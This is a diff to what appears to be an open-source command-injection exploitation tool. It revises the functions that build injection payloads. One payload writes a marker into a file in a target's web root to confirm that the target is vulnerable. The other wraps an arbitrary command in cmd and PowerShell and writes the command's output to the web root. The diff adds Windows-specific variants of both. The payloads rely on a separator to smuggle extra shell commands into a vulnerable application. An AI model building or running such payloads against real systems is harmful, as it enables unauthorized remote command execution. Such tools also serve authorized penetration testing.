@@ -26,11 +26,14 @@ from src.core.injections.controller import checks
 File-based decision payload (check if host is vulnerable). 
 """
 def decision(separator, TAG, OUTPUT_TEXTFILE):
-
-
-  payload = (separator +
-            "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
-            ) 
+  if settings.TARGET_OS == "win":
+    payload = (separator +
+              settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + " '" + TAG + "'\""
+              ) 
+  else:
+    payload = (separator +
+              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
+              ) 
 
   return payload
 
@@ -75,7 +78,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
-              "\")\"') do @set /p = %i" + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "<nul"
+              "\")\"') do " + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + " '%i'" + "<nul"
               ) 
   else:
     payload = (separator +
